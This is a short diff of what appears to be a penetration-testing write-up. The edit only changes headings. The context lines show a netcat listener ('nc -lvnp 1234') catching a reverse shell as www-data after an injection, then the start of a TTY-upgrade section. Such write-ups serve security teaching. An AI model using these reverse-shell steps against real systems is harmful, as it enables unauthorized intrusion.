@@ -45,7 +45,7 @@ attacking-machine$ nc -lvnp 1234
    -p 1234 Port number netcat is listening on.
 ```
 
-### Results of the injection:
+#### Results of the injection:
 
 ```bash
 attacker@attacking-machine$ nc -lvnp 1234
@@ -60,7 +60,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <mark style="color:green;">We successfully got a connection back now it's time to make it more stable and efficient.</mark>
 {% endhint %}
 
-### 3. Upgrading TTY:
+### Upgrading TTY:
 
 In order to upgrade our shell to a fully TTY let's follow these steps:
 
